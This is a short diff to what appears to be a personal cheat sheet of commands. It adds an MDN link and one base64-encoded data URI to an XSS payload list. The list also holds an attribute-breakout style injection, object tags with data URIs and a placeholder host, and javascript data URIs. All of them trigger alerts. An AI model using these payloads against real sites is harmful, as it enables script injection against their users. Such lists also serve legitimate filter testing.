@@ -58,7 +58,9 @@ few scripts and useful commands
 # xss
 <ul>
 <li> " style="background-image: url(http://blabla.com) </li>
+<li> https://developer.mozilla.org/fr/docs/Web/HTTP/Basics_of_HTTP/Data_URIs </li>
 <li> &lt;object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+>&lt;/object> </li>
 <li> &lt;object data=http://blabla.com>&lt;/object> </li>
 <li> data:text/javascript,alert(0) </li>
+<li> data:text/javascript;base64,YWxlcnQoMCk= </li>
 </ul>
